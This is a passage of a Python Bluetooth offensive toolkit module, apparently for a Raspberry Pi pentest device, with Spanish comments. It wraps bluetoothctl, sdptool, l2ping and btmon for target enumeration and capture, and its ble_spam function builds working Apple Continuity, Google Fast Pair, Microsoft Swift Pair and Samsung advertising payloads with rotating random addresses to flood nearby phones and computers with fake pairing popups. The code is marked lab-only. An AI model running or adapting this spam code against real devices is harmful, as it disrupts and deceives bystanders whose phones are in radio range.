        mh = _RX_SDP_RHANDLE.match(line.strip())
        if mh:
            cur["rec_handle"] = mh.group(1)
            continue
        if line.strip().startswith('Service Class ID List'):
            in_classes = True
            continue
        if in_classes:
            mc = _RX_SDP_CLASS.match(line.strip())
            if mc:
                cur["classes"].append((mc.group(1).strip(), mc.group(2)))
            elif line.strip() == "" or (line and not line.startswith((' ', '\t'))):
                in_classes = False
    if cur: services.append(cur)
    return services


def _quick_info(mac):
    """`bluetoothctl info <mac>` rapido (sin cambiar discovery). Devuelve
    dict con addr_type/name/paired/connected o None si no responde."""
    r = _run([BLUETOOTHCTL, 'info', mac], timeout=4)
    if not r or not r.stdout:
        return None
    return parse_bluetoothctl_info(r.stdout)


def _is_ble_only(info):
    """Heuristica: si el peer tiene addr_type 'random' es BLE puro. Las
    MAC con bit 0x02 del 1er octeto tambien son locally administered -> BLE."""
    if info and (info.get("addr_type") or "").lower() == "random":
        return True
    return False


def sdp_browse(mac, addr_type=None, timeout=15):
    """Enumera servicios BR/EDR del target via SDP (sin pairing). Util para
    identificar perfil (A2DP/HFP/HID/OBEX...) y evaluar superficie de ataque.
    Solo aplica a BR/EDR classic; para LE puro usa GATT.

    `addr_type`: hint del scan ("public"/"random"/""). Si viene "random",
    bloqueamos sin preguntar a bluetoothctl. Si viene "public", confiamos y
    probamos SDP incluso aunque la MAC tenga el bit locally-administered."""
    mac = (mac or '').strip().upper()
    if not re.fullmatch(r'[0-9A-F:]{17}', mac):
        return None, "MAC invalida"

    at = (addr_type or '').lower()
    if at == 'random':
        err = "SDP no aplica: device BLE (addr_type=random del scan). Usa GATT."
        log_bt_attack("sdp_browse", mac, "n_a", details=err)
        return {"services": [], "raw": ""}, err
    if at != 'public':
        # Sin hint confiable del scan: preflight con bluetoothctl.
        info = _quick_info(mac)
        if _is_ble_only(info):
            err = "SDP no aplica: device BLE (addr random). Usa GATT."
            log_bt_attack("sdp_browse", mac, "n_a", details=err)
            return {"services": [], "raw": ""}, err

    r = _run([SUDO, '-n', SDPTOOL, 'browse', mac], timeout=timeout)
    text = ""
    if r:
        text = (r.stdout or '') + (r.stderr or '')
    services = parse_sdptool_browse(text)
    err = None
    if (r is None) or (r.returncode != 0 and not services):
        err = (text.strip() or "sin respuesta")[:200]
    result = "ok" if services else ("fail" if err else "empty")
    log_bt_attack("sdp_browse", mac, result,
                  details=f"services={len(services)}" + (f" err={err}" if err else ""))
    return {"services": services, "raw": text[-800:]}, err


_RX_GATT_SERVICE = re.compile(r'Service\s+(?:Attribute\s+)?/org/bluez/[^\s]+/service([0-9a-f]+)\s*(?:$|\s)', re.I)
# UUID 128-bit canonical dentro de parentesis (bluetoothctl format):
#   "UUID: Generic Access Profile    (00001800-0000-1000-8000-00805f9b34fb)"
_RX_GATT_UUID    = re.compile(r'\(([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\)')
_RX_GATT_LABEL   = re.compile(r'UUID:\s+(.+?)\s*\([0-9a-fA-F-]+\)\s*$')


def parse_bluetoothctl_gatt(text):
    """Parsea el stream interactivo de `menu gatt` + `list-attributes`:
       Primary Service (Handle 0x????)
            /org/bluez/hci0/dev_XX/serviceNN
            UUID: 00001800-0000-1000-8000-00805f9b34fb
       Characteristic (Handle 0x????)
            /org/bluez/hci0/dev_XX/serviceNN/charMM
            UUID: ...
    Devuelve lista de dicts {kind:'service'|'characteristic', path, uuid, label}."""
    attrs = []
    cur = None
    for raw in (text or '').splitlines():
        line = _RX_ANSI.sub('', raw).strip()
        low = line.lower()
        if 'primary service' in low:
            if cur: attrs.append(cur)
            cur = {"kind": "service", "path": "", "uuid": "", "label": ""}
            continue
        if low.startswith('characteristic'):
            if cur: attrs.append(cur)
            cur = {"kind": "characteristic", "path": "", "uuid": "", "label": ""}
            continue
        if low.startswith('descriptor'):
            if cur: attrs.append(cur)
            cur = {"kind": "descriptor", "path": "", "uuid": "", "label": ""}
            continue
        if cur is None:
            continue
        if line.startswith('/org/bluez/'):
            cur["path"] = line
            continue
        if 'UUID:' in line or line.lstrip().startswith('UUID'):
            mu = _RX_GATT_UUID.search(line)
            if mu:
                cur["uuid"] = mu.group(1).lower()
            ml = _RX_GATT_LABEL.search(line)
            if ml:
                cur["label"] = ml.group(1).strip()[:48]
            continue
    if cur: attrs.append(cur)
    return attrs


def gatt_enum(mac, iface=DEFAULT_IFACE, timeout=30):
    """Enumera services + characteristics GATT de un device LE. Conecta via
    bluetoothctl interactivo (sin pairing para servicios publicos), lista los
    atributos, desconecta. Si el device requiere pairing o rechaza, devuelve
    error con detalle. SOLO lab."""
    mac = (mac or '').strip().upper()
    if not re.fullmatch(r'[0-9A-F:]{17}', mac):
        return None, "MAC invalida"
    try:
        _iface_index(iface)
    except ValueError as e:
        return None, str(e)
    ok, msg = power_on(iface)
    if not ok:
        return None, f"No se pudo encender {iface}: {msg}"
    bd = _bd_address(iface)
    if not bd:
        return None, f"No se pudo obtener BD de {iface}"

    proc = subprocess.Popen(
        [BLUETOOTHCTL],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, text=True, bufsize=1,
    )
    lines = []
    stop = threading.Event()
    def _rd():
        try:
            for line in iter(proc.stdout.readline, ''):
                if stop.is_set(): break
                lines.append(line)
        except Exception:
            pass
    t = threading.Thread(target=_rd, daemon=True); t.start()

    err = None
    try:
        proc.stdin.write(f"select {bd}\n")
        proc.stdin.write(f"connect {mac}\n")
        proc.stdin.flush()
        # Esperamos a Connected: yes o fallo (hasta 15s; devices lentos como
        # IoT barato pueden tardar 10s+ en completar el GATT discovery inicial).
        t0 = time.time()
        connected = False
        while time.time() - t0 < 15:
            full = ''.join(lines)
            if 'Connected: yes' in full or 'ServicesResolved: yes' in full:
                connected = True; break
            if 'Failed to connect' in full:
                # Causa clara segun el mensaje tipico de bluez:
                if 'le-connection-abort-by-local' in full:
                    err = "connect fallo (device rechazo). Puede requerir pairing."
                elif 'br-connection-page-timeout' in full:
                    err = "connect fallo (page timeout). BR/EDR fuera de alcance o apagado."
                elif 'not available' in full:
                    err = "connect fallo (adapter busy). Reintenta."
                else:
                    err = "connect fallo (device no acepta conexion sin pairing)."
                break
            if 'org.bluez.Error' in full:
                err = "connect fallo (bluez error; ver action_log)"; break
            time.sleep(0.3)
        if connected:
            # Dar tiempo al GATT discovery (puede tardar en IoT lentos)
            time.sleep(4)
            proc.stdin.write("menu gatt\n")
            proc.stdin.write("list-attributes\n")
            proc.stdin.flush()
            time.sleep(3)
            proc.stdin.write("back\n")
            proc.stdin.write(f"disconnect {mac}\n")
            proc.stdin.flush()
            time.sleep(1)
        proc.stdin.write("quit\n")
        proc.stdin.flush()
        try: proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired: proc.kill()
    except Exception as e:
        try: proc.kill()
        except Exception: pass
        stop.set(); t.join(timeout=1)
        return None, f"bluetoothctl fallo: {e}"

    stop.set(); t.join(timeout=1)
    out = ''.join(lines)
    if err is None and 'Failed to connect' in out:
        err = "connect fallo"
    attrs = parse_bluetoothctl_gatt(out)
    services = [a for a in attrs if a["kind"] == "service"]
    chars    = [a for a in attrs if a["kind"] == "characteristic"]

    result = "ok" if attrs else ("fail" if err else "empty")
    log_bt_attack("gatt_enum", mac, result,
                  details=f"services={len(services)} chars={len(chars)}" +
                          (f" err={err}" if err else ""))
    return {"services": services, "characteristics": chars,
            "raw": out[-1500:]}, err


_RX_L2PING_SENT = re.compile(r'^(\d+)\s+bytes\s+from\s+([0-9A-F:]{17})\s+id\s+(\d+)\s+time\s+([\d.]+)\s*ms', re.I)
_RX_L2PING_STAT = re.compile(r'^(\d+)\s+sent,\s+(\d+)\s+received,\s+(\d+)%\s+loss', re.I)


def parse_l2ping_output(text):
    """Parsea `l2ping` output. Devuelve stats: {sent, received, loss_pct,
    avg_ms, min_ms, max_ms, samples:[{id, time_ms}]}."""
    samples = []
    for raw in (text or '').splitlines():
        m = _RX_L2PING_SENT.match(raw.strip())
        if m:
            try:
                samples.append({"id": int(m.group(3)),
                                "time_ms": float(m.group(4))})
            except Exception:
                pass
    stats = {"sent": 0, "received": 0, "loss_pct": None,
             "avg_ms": None, "min_ms": None, "max_ms": None,
             "samples": samples}
    for raw in (text or '').splitlines():
        m = _RX_L2PING_STAT.match(raw.strip())
        if m:
            try:
                stats["sent"] = int(m.group(1))
                stats["received"] = int(m.group(2))
                stats["loss_pct"] = int(m.group(3))
            except Exception:
                pass
    if samples:
        times = [s["time_ms"] for s in samples]
        stats["avg_ms"] = round(sum(times) / len(times), 2)
        stats["min_ms"] = round(min(times), 2)
        stats["max_ms"] = round(max(times), 2)
    return stats


def l2ping(mac, count=5, size=44, addr_type=None, timeout=20):
    """L2CAP ping (BR/EDR). Prueba de alcance/latencia y stress leve. SOLO
    funciona con BR/EDR classic; para BLE puro no aplica.
    `addr_type`: hint del scan; igual flow que sdp_browse. SOLO lab."""
    mac = (mac or '').strip().upper()
    if not re.fullmatch(r'[0-9A-F:]{17}', mac):
        return None, "MAC invalida"

    at = (addr_type or '').lower()
    def _n_a(err_msg):
        empty = {"sent": 0, "received": 0, "loss_pct": None,
                 "avg_ms": None, "min_ms": None, "max_ms": None, "samples": []}
        log_bt_attack("l2ping", mac, "n_a", details=err_msg)
        return {"stats": empty, "raw": ""}, err_msg

    if at == 'random':
        return _n_a("L2ping no aplica: device BLE (addr_type=random del scan). Usa GATT.")
    if at != 'public':
        info = _quick_info(mac)
        if _is_ble_only(info):
            return _n_a("L2ping no aplica: device BLE (addr random). Usa GATT.")

    count = max(1, min(int(count or 5), 50))
    size = max(1, min(int(size or 44), 600))
    r = _run([SUDO, '-n', L2PING, '-c', str(count), '-s', str(size), mac],
             timeout=timeout)
    text = ""
    if r:
        text = (r.stdout or '') + (r.stderr or '')
    err = None
    if r is None:
        err = "l2ping: sin respuesta"
    elif r.returncode != 0 and 'bytes from' not in text:
        err = text.strip()[-200:] or "l2ping fallo"
    stats = parse_l2ping_output(text)
    result = "ok" if stats["received"] > 0 else ("fail" if err else "empty")
    log_bt_attack("l2ping", mac, result,
                  details=f"sent={stats['sent']} recv={stats['received']} loss={stats['loss_pct']}% avg={stats['avg_ms']}ms")
    return {"stats": stats, "raw": text[-600:]}, err


# ---------------------------------------------------------------------------
# BLE spam / fake advertising (SOLO lab)
# ---------------------------------------------------------------------------

def _load_ble_names():
    """Lee data/ble_names.txt. Devuelve lista no vacia (fallback a 3 nombres
    si el archivo falta o esta vacio)."""
    paths = (
        os.path.expanduser("~/piscanlvgl/data/ble_names.txt"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)),
                     "..", "..", "data", "ble_names.txt"),
    )
    names = []
    for p in paths:
        if os.path.exists(p):
            try:
                with open(p, "r", errors="replace") as f:
                    for raw in f:
                        s = raw.strip()
                        if not s or s.startswith("#"):
                            continue
                        names.append(s[:32])  # bluez corta en algunos tamaños
                if names:
                    break
            except Exception:
                pass
    if not names:
        names = ["Piscan-Dev", "AirPods Pro", "JBL Flip 6"]
    return names


def _hci(iface, ocf, data_bytes, timeout=3):
    """Envia un HCI command raw del grupo LE (OGF=0x08) via `hcitool`.
    Preferido a bluetoothctl advertise porque LeAdvertisingManager1 del bluez
    falla con 'org.bluez.Error.Failed' en los chips comunes de la Pi
    (BCM43438 onboard y RTL8821CU USB) al registrar advertisements."""
    cmd = [SUDO, '-n', HCITOOL, '-i', iface, 'cmd',
           '0x08', '0x%04x' % ocf]
    for b in data_bytes:
        cmd.append('%02x' % (b & 0xFF))
    return _run(cmd, timeout=timeout)


# Nombres de los status HCI que mas nos interesan al anunciar.
_HCI_STATUS_NAMES = {
    0x00: "success",
    0x01: "unknown command",
    0x0C: "command disallowed",
    0x11: "unsupported feature/parameter",
    0x12: "invalid HCI parameters",
    0x1A: "unsupported remote feature",
}


def _hci_status(text):
    """Extrae el byte de status del evento que `hcitool cmd` imprime en stdout.

    CLAVE: `hcitool cmd` sale con exit code 0 si logro ENVIAR el comando y
    recibir CUALQUIER evento de respuesta, AUNQUE el controller lo rechace
    (p.ej. 0x0C Command Disallowed cuando bluetoothd ya controla el
    advertising). Por eso `returncode` NO alcanza para saber si el comando
    surtio efecto: hay que leer el status del evento Command Complete (0x0e)
    o Command Status (0x0f). Esta era la causa de 'dice OK pero no anuncia'.

    Formato tipico:
        > HCI Event: 0x0e plen 4
          01 0A 20 00
    En Command Complete (0x0e) los datos son: num_cmds(1) opcode(2) status(1)
    -> status = 4to byte. En Command Status (0x0f): status(1) num_cmds(1)
    opcode(2) -> status = 1er byte. Devuelve int, o None si no se puede leer
    (stdout vacio en tests, u otro formato de hcitool)."""
    if not text:
        return None
    lines = [ln.strip() for ln in text.splitlines()]
    for i, line in enumerate(lines):
        low = line.lower()
        if 'hci event' not in low:
            continue
        is_cc = '0x0e' in low
        is_cs = '0x0f' in low
        if not (is_cc or is_cs):
            continue
        for j in range(i + 1, min(i + 4, len(lines))):
            hexb = re.findall(r'\b[0-9A-Fa-f]{2}\b', lines[j])
            if is_cc and len(hexb) >= 4:
                try: return int(hexb[3], 16)
                except Exception: return None
            if is_cs and len(hexb) >= 1:
                try: return int(hexb[0], 16)
                except Exception: return None
    return None


def _hci_ok(r):
    """(ok, status) de un resultado de `_hci`. ok=True solo si el comando se
    envio (returncode 0) Y el controller lo acepto (status 0x00). Si no hay
    status legible (stdout vacio), confiamos en el returncode."""
    if r is None or getattr(r, 'returncode', 1) != 0:
        return False, None
    st = _hci_status(getattr(r, 'stdout', '') or '')
    if st is None:
        return True, None
    return (st == 0x00), st


def _hci_describe(st):
    """' (HCI status 0xNN nombre)' para los mensajes de error, o '' si None."""
    if st is None:
        return ""
    return f" (HCI status 0x{st:02X} {_HCI_STATUS_NAMES.get(st, 'error')})"


def _load_payloads(kind):
    """Lee data/ble_payloads/<kind>.txt. Cada linea:
       name=<str>|cid=<4-hex>|data=<hex-pairs>
    `cid` y `data` opcionales. Retorna lista de dicts."""
    paths = (
        os.path.expanduser(f"~/piscanlvgl/data/ble_payloads/{kind}.txt"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)),
                     "..", "..", "data", "ble_payloads", f"{kind}.txt"),
    )
    items = []
    for p in paths:
        if not os.path.exists(p):
            continue
        try:
            with open(p, "r", errors="replace") as f:
                for raw in f:
                    s = raw.strip()
                    if not s or s.startswith("#"):
                        continue
                    d = {"name": "", "cid": None, "data": b''}
                    for part in s.split("|"):
                        part = part.strip()
                        if part.startswith("name="):
                            d["name"] = part[5:].strip()[:24]
                        elif part.startswith("cid="):
                            try:
                                d["cid"] = int(part[4:].strip(), 16)
                            except Exception:
                                pass
                        elif part.startswith("data="):
                            try:
                                hx = re.sub(r'\s+', '', part[5:])
                                d["data"] = bytes.fromhex(hx)[:20]
                            except Exception:
                                pass
                    if d["name"] or d["cid"] is not None:
                        items.append(d)
            if items:
                break
        except Exception:
            pass
    return items


def _build_adv_payload(item, max_len=31):
    """Construye el AD payload (<=31 bytes legacy) con AD Flags + opcional
    Manufacturer Specific Data + opcional Complete Local Name."""
    out = bytearray()
    # AD Flags: General Discoverable + BR/EDR Not Supported.
    out += bytes([0x02, 0x01, 0x06])
    cid = item.get("cid") if item else None
    data = item.get("data") or b'' if item else b''
    name = (item.get("name") or '').encode('utf-8', errors='ignore') if item else b''

    if cid is not None:
        md = bytes([cid & 0xFF, (cid >> 8) & 0xFF]) + bytes(data)
        if len(out) + 2 + len(md) <= max_len:
            out += bytes([1 + len(md), 0xFF]) + md
    if name:
        remain = max_len - len(out) - 2
        if remain > 0:
            adv_type = 0x09  # Complete Local Name
            if len(name) > remain:
                name = name[:remain]
                adv_type = 0x08  # Shortened Local Name
            out += bytes([1 + len(name), adv_type]) + name
    return bytes(out[:max_len])


def _random_static_address():
    """Genera una direccion BLE aleatoria estatica.
    El octeto mas significativo se entrega con los bits 11 al HCI.
    """
    addr = bytearray(os.urandom(6))
    addr[5] |= 0xC0
    # LE Set Random Address recibe BD address en formato little-endian.
    return list(reversed(addr))


def _build_apple_payload():
    """Apple Continuity Nearby Action - genera popup en iOS <= 17.1 ("New
    AirPods", "Setup Apple TV", "Pair HomePod"). Entra en 31 bytes de legacy
    adv. Compatibilidad con el proyecto Bruce/ESP32-BLE-Spam."""
    # (action_type, device_byte) - subset de ANOs de Continuity.
    actions = (
        (0x27, 0x81),  # Setup new AirPods Pro
        (0x27, 0x06),  # Setup new AirPods Max
        (0x27, 0x0E),  # AirPods Pro 2
        (0x09, 0x15),  # Setup new Apple TV
        (0x0B, 0x11),  # HomePod mini
        (0x01, 0x00),  # AppleTV AutoFill
        (0x06, 0x00),  # AppleTV Keyboard
        (0x1B, 0x00),  # Developer Tools Pairing Request
        (0x1E, 0x00),  # Setup new Beats
        (0x29, 0x00),  # Setup new Vision Pro
    )
    act, dev = random.choice(actions)
    # Flags(3) + Manuf (3+16=19) = max 22 bytes
    # 02 01 06 | 1B FF 4C 00 | 0F 05 C1 ACT DEV ...rand padding
    pad = os.urandom(10)
    return bytes([
        0x02, 0x01, 0x06,
        0x1B, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1,
        act, dev,
        0x4A, 0x30,
    ]) + pad[:17]


# Model IDs reales registrados en Google Fast Pair Service (dispositivos que
# disparan el popup "Device nearby" en Android con Fast Pair activo).
_GOOGLE_FP_MODELS = (
    0xCD8256, 0x0001F0, 0x000006, 0x02F707, 0x02FB90,
    0xD446A7, 0x8B9D30, 0x92BBBD, 0xF99DAB, 0x323AF4,
    0x7E7E35, 0x1E3C72, 0x2CDA74, 0xC8F560, 0xDBB769,
    0x9ADB11, 0x47FA2B, 0x821F66,
)


def _build_google_payload():
    """Google Fast Pair - Service Data con UUID 0xFE2C + 3-byte model_id de
    un device REAL registrado en Fast Pair Service. Dispara popup "Dispositivo
    cercano" en Android >= 6 con Fast Pair activo. Compat Bruce."""
    model = random.choice(_GOOGLE_FP_MODELS)
    return bytes([
        0x02, 0x01, 0x06,       # Flags: General Discoverable + BR/EDR not supp
        0x03, 0x03, 0x2C, 0xFE, # Incomplete 16-bit UUID list: 0xFE2C
        0x06, 0x16, 0x2C, 0xFE, # Service Data (0x16) UUID 0xFE2C, len 6
        (model >> 16) & 0xFF,
        (model >> 8)  & 0xFF,
        model & 0xFF,
    ])


def _build_microsoft_payload():
    """Microsoft Swift Pair beacon. Dispara popup "Nuevo dispositivo encontrado"
    en Windows 10/11 con Swift Pair activo. Payload compat Bruce/ESP32."""
    # 02 01 06 | 09 FF 06 00 03 00 80 06 XX | ...
    device_byte = random.choice((0x06, 0x01, 0x02, 0x04, 0x20))
    return bytes([
        0x02, 0x01, 0x06,
        0x09, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80,
        device_byte, 0x00,
    ])


def _build_samsung_buds_payload():
    """Construye el paquete Galaxy Buds usado por Bruce/FastPair.
    Samsung EasySetup reconoce la trama completa manufacturer-specific.
    """
    models = (
        0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116,
        0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
        0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503,
        0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
        0x123456, 0x654321, 0x789ABC, 0xDEF123, 0x456789,
        0xABC123, 0x321654, 0x987654, 0x654987, 0x321987,
    )
    model = random.choice(models)
    payload = [
        27, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02,
        0x14, 0x15, 0x03, 0x21, 0x01, 0x09,
        (model >> 16) & 0xFF, (model >> 8) & 0xFF, 0x01,
        model & 0xFF, 0x06, 0x3C, 0x94, 0x8E,
        0x00, 0x00, 0x00, 0x00, 0xC7, 0x00,
        0x10, 0xFF, 0x75,
    ]
    return bytes(payload[:31])


def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
    """BLE spam via HCI raw commands (hcitool). Rotamos LE Set Advertising
    Data cada `period_s` segundos durante `seconds`.

    mode:
      names   - rota nombres de data/ble_names.txt
      random  - "Dev-xxxx" aleatorios
      apple   - data/ble_payloads/apple.txt   (Apple Continuity -> iOS/macOS)
      google  - data/ble_payloads/google.txt  (Google Fast Pair/Nearby -> Android)
      microsoft - .../microsoft.txt           (Swift Pair -> Windows 10/11)
      samsung - .../samsung.txt               (Buds Live-like -> Samsung)

    Usamos hcitool HCI raw porque bluez `LeAdvertisingManager1` falla con
    'org.bluez.Error.Failed' en los chips comunes de la Pi (confirmado el
    2026-10-29 con BCM43438 onboard y RTL8821CU USB). hcitool va directo al
    kernel por mgmt sock. SOLO lab."""
    try:
        _iface_index(iface)
    except ValueError as e:
        return None, str(e)
    seconds = max(2, min(int(seconds or 20), 300))
    period = max(0.3, float(period_s))
    mode = (mode or "names").lower()

    ok, msg = power_on(iface)
    if not ok:
        return None, f"No se pudo encender {iface}: {msg}"

    # LE Set Advertise Enable OFF (limpia estado previo)
    r = _hci(iface, 0x000A, [0x00])
    if r is None or r.returncode != 0:
        return None, "hcitool: no se pudo hablar con el controller (sudoers?)"
    time.sleep(0.1)
    # LE Set Advertising Parameters: interval 100ms, CONNECTABLE (ADV_IND), 3 ch.
    # Conectable (adv_type=0x00) es clave: Google Fast Pair y MS Swift Pair SOLO
    # disparan el popup con advertising conectable, y los nombres aparecen en la
    # lista de Bluetooth del telefono. Verificado on-device (2026-10-29): la
    # trama irradia y otro radio la recibe; antes era 0x03 (no-conectable) -> no
    # salia popup aunque el advert si estaba al aire.
    r = _hci(iface, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
    if r is None or r.returncode != 0:
        _hci(iface, 0x000A, [0x00])
        return None, "hcitool: no pudo configurar el intervalo/canales BLE"

    # Pool de payloads segun modo.
    if mode in ("apple", "google", "microsoft", "samsung"):
        pool = _load_payloads(mode)
        if not pool:
            # Fallback a names si falta el archivo.
            pool = [{"name": n, "cid": None, "data": b''}
                    for n in _load_ble_names()]
            mode = f"{mode}(fallback=names)"
    elif mode == "random":
        pool = [{"name": "Dev-%04x" % random.randint(0, 0xFFFF),
                 "cid": None, "data": b''} for _ in range(32)]
    else:
        pool = [{"name": n, "cid": None, "data": b''}
                for n in _load_ble_names()]

    # Mapa mode -> constructor nativo (payload Bruce-compatible, con MAC
    # random rotada en cada iteracion). Los modos "names"/"random" caen al
    # flujo generico que usa pool + _build_adv_payload (MAC public, sin rotar).
    OS_BUILDERS = {
        "apple":     _build_apple_payload,
        "google":    _build_google_payload,
        "microsoft": _build_microsoft_payload,
        "samsung":   _build_samsung_buds_payload,
    }
    builder = None
    for key in OS_BUILDERS:
        if mode.startswith(key):
            builder = OS_BUILDERS[key]; break

    # Para los modos OS-specific aceleramos el periodo (default 1s se baja a
    # ~0.5s = 2 popups/s) para que los teléfonos cercanos vean varios devices.
    if builder is not None and period >= 0.9:
        period = 0.5

    cycles = 0
    failed_commands = 0
    last_bad_status = None   # ultimo status HCI != 0x00 (el que explica el fallo)
    uniq_names = set()
    last_name = ""
    t_end = time.time() + seconds
    while time.time() < t_end:
        if builder is not None:
            # Rotamos MAC random + own_addr_type=0x01 en cada ciclo para que el
            # teléfono vea un "device nuevo" cada vez (si usamos la misma MAC
            # pública, Android/iOS filtran y no sale popup).
            payload = builder()
            n = f"{mode}-{cycles}"
            ok_dis, _      = _hci_ok(_hci(iface, 0x000A, [0x00]))
            ok_addr, _     = _hci_ok(_hci(iface, 0x0005, _random_static_address()))
            ok_par, st_par = _hci_ok(_hci(iface, 0x0006, [
                0xA0, 0x00, 0xA0, 0x00, 0x00, 0x01,   # adv_type=0x00 CONNECTABLE
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00,
            ]))
            if not (ok_dis and ok_addr and ok_par):
                failed_commands += 1
                if st_par not in (None, 0x00):
                    last_bad_status = st_par
                time.sleep(period)
                continue
        else:
            item = random.choice(pool)
            payload = _build_adv_payload(item)
            n = item.get("name", "")
            # Desactivar antes de re-habilitar: un `LE Set Advertise Enable` sobre
            # un advertising YA activo devuelve 0x0C (command disallowed). El path
            # OS ya desactiva al inicio del ciclo; el generico no lo hacia, asi
            # que solo el 1er ciclo "enganchaba" y el resto se contaba como fallo.
            _hci(iface, 0x000A, [0x00])
        if not payload:
            continue
        padded = payload + bytes(31 - len(payload))
        ok_data, st_data = _hci_ok(_hci(iface, 0x0008, [len(payload)] + list(padded)))
        ok_en,   st_en   = _hci_ok(_hci(iface, 0x000A, [0x01]))
        if not (ok_data and ok_en):
            failed_commands += 1
            # El enable (0x000A) es el que pone el advert al aire: su status es
            # el mas informativo (p.ej. 0x0C = bluetoothd tiene el advertising).
            for st in (st_en, st_data):
                if st not in (None, 0x00):
                    last_bad_status = st
                    break
            time.sleep(period)
            continue
        cycles += 1
        if n:
            uniq_names.add(n); last_name = n
        time.sleep(period)

    # Teardown
    _hci(iface, 0x000A, [0x00])

    status_name = (_HCI_STATUS_NAMES.get(last_bad_status)
                   if last_bad_status is not None else None)
    log_bt_attack("ble_spam", "", "ok" if cycles > 0 else "fail",
                  details=f"iface={iface} mode={mode} seconds={seconds} "
                          f"cycles={cycles} uniq={len(uniq_names)} "
                          f"last={last_name} failed_commands={failed_commands} "
                          f"hci_status={_hci_describe(last_bad_status).strip()}")
    err = None
    if failed_commands:
        if last_bad_status == 0x0C:
            hint = (" — el controller rechaza el advertising (command "
                    "disallowed): bluetoothd probablemente lo tiene tomado. "
                    "Para 'sudo systemctl stop bluetooth' o usa el onboard hci0.")
        elif last_bad_status in (0x11, 0x12):
            hint = (" — el controller no soporta estos parametros de "
                    "advertising (prueba el onboard hci0).")
        else:
            hint = " — comprueba sudoers/rfkill/controller"
        err = (f"hcitool: {failed_commands} orden(es) HCI rechazadas"
               f"{_hci_describe(last_bad_status)}{hint}")
    return {"iface": iface, "mode": mode, "seconds": seconds,
            "cycles": cycles, "uniq_names": len(uniq_names),
            "last_name": last_name, "failed_commands": failed_commands,
            "hci_status": last_bad_status, "hci_status_name": status_name,
            "raw": ""}, err


# ---------------------------------------------------------------------------
# btmon capture (sniffer HCI; genera archivo .btsnoop compatible Wireshark)
# ---------------------------------------------------------------------------

def _capture_dir():
    d = os.path.expanduser("~/piscanlvgl/data/captures")
    try:
        os.makedirs(d, exist_ok=True)
    except Exception:
        pass
    return d


def _btsnoop_count_packets(path):
    """Cuenta registros HCI en un archivo .btsnoop (header 16B + por record:
    orig(4) incl(4) flags(4) drops(4) ts(8) + data). None si no es btsnoop."""
    import struct
    try:
        with open(path, 'rb') as f:
            header = f.read(16)
            if len(header) < 16 or header[:8] != b'btsnoop\x00':
                return None
            count = 0
            while True:
                rec = f.read(24)
                if len(rec) < 24:
                    break
                _, incl, _, _, _ = struct.unpack('>IIIIQ', rec)
                if incl > (1 << 20):
                    break  # proteccion ante corrupcion
                data = f.read(incl)
                if len(data) < incl:
                    break
                count += 1
            return count
    except Exception:
        return None


def btmon_capture(iface=DEFAULT_IFACE, seconds=30):
    """Captura HCI con `btmon` a archivo. Formato btsnoop (abierto por
    Wireshark/btmon --read). SOLO lab. Devuelve path + size + duration real
    + packet_count (parseando el header btsnoop)."""
    try:
        _iface_index(iface)
    except ValueError as e:
        return None, str(e)
    seconds = max(2, min(int(seconds or 30), 600))
    power_on(iface)   # no es critico que falle; btmon ve todo igual

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(_capture_dir(), f"btmon_{iface}_{ts}.btsnoop")

    t0 = time.time()
    r = _run([SUDO, '-n', TIMEOUT_BIN, str(seconds),
              BTMON, '-i', iface, '-w', path],
             timeout=seconds + 10)
    dur = round(time.time() - t0, 2)

    text = ""
    if r:
        text = (r.stdout or '') + (r.stderr or '')

    size = 0
    try:
        if os.path.exists(path):
            size = os.path.getsize(path)
    except Exception:
        pass

    packets = _btsnoop_count_packets(path) if size > 0 else None

    err = None
    if size == 0:
        err = (text.strip() or "btmon no genero archivo (ver permisos)")[-200:]

    result = "ok" if size > 0 else "fail"
    log_bt_attack("capture", "", result,
                  details=f"iface={iface} path={path} size={size}B "
                          f"packets={packets if packets is not None else '?'} "
                          f"dur={dur}s" + (f" err={err}" if err else ""))
    return {"iface": iface, "path": path, "size": size,
            "duration_s": dur, "packets": packets,
            "raw": text[-400:]}, err


# ---------------------------------------------------------------------------
# Show (bluetoothctl info enriquecido, para una MAC concreta)
# ---------------------------------------------------------------------------

def show(mac, iface=DEFAULT_IFACE):
    rr = _run([BLUETOOTHCTL, '--timeout', '3', 'info', mac], timeout=10)
    if not rr or not rr.stdout:
        return None, "sin respuesta de bluetoothctl"
    d = parse_bluetoothctl_info(rr.stdout)
    d["vendor"] = _vendor_for(d.get("mac") or mac)
    return d, None


# ---------------------------------------------------------------------------
# CLI dispatcher
# ---------------------------------------------------------------------------

def _emit(obj):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass
    try:
        print(json.dumps(obj, ensure_ascii=True))
    except Exception as e:
        print(json.dumps({"ok": False, "error": f"json: {e}"}))


def main():
    if len(sys.argv) < 2:
        _emit({"ok": False, "error": "uso: bt_ops.py <up|down|info|scan|show|sdp|gatt|l2ping|spam|capture> [args]"})
        sys.exit(1)
    cmd = sys.argv[1]
    iface = DEFAULT_IFACE
    if len(sys.argv) > 2 and re.match(r'^hci\d+$', sys.argv[2]):
        iface = sys.argv[2]

    try:
        if cmd == 'up':
            ok, msg = power_on(iface)
            _emit({"ok": ok, "iface": iface, "msg": msg})
        elif cmd == 'down':
            ok, msg = power_off(iface)
